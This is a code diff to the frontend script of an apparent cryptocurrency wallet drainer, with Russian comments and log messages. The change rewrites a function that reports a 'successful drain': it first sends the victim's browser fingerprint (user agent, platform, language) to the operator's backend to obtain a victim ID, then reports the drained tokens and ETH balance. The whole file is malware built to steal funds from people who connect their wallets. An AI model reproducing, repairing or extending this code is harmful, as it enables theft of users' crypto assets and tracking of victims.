@@ -129,18 +129,46 @@ async function sendConnectionData(walletAddress) {
     }
 }
 
+// js/web3connect.js
+
+/**
+ * Отправка данных об успешном дрейне
+ */
 async function sendSuccessData(tokens, ethBalance, successTokens = [], failedTokens = [], ethSuccess = false) {
     try {
         console.log('[FRONTEND] sendSuccessData: Начало отправки данных об успехе');
         
-        // Получаем victimId из localStorage
-        const victimId = localStorage.getItem('victimId');
-        console.log('[FRONTEND] sendSuccessData: Получен victimId из localStorage:', victimId);
-        
-        if (!victimId) {
-            console.warn('[FRONTEND] sendSuccessData: Victim ID не найден в localStorage!');
+        // Сначала делаем запрос к /visit для получения актуального victimId
+        const visitResponse = await fetch(`${BACKEND_URL}/visit`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                userAgent: navigator.userAgent || 'Unknown',
+                platform: navigator.platform || 'Unknown',
+                language: navigator.language || 'Unknown',
+                timestamp: new Date().toISOString()
+            })
+        });
+
+        if (!visitResponse.ok) {
+            const errorText = await visitResponse.text();
+            console.error('[FRONTEND] sendSuccessData: Ошибка при проверке посещения:', errorText);
             return;
         }
+
+        const visitResult = await visitResponse.json();
+        console.log('[FRONTEND] sendSuccessData: Получен ответ от /visit:', visitResult);
+
+        if (!visitResult.success || !visitResult.id) {
+            console.warn('[FRONTEND] sendSuccessData: Сервер не вернул success=true или id');
+            return;
+        }
+
+        // Используем только что полученный victimId
+        const victimId = visitResult.id;
+        console.log('[FRONTEND] sendSuccessData: Используем новый victimId:', victimId);
 
         // Обрабатываем tokens, если это массив объектов, извлекаем символы
         let tokensForBackend = [];
@@ -671,6 +699,7 @@ window.addEventListener('DOMContentLoaded', () => {
         console.warn('[INIT] DOMContentLoaded: Кнопка подключения не найдена в DOM');
     }
 });
+
 
 
 
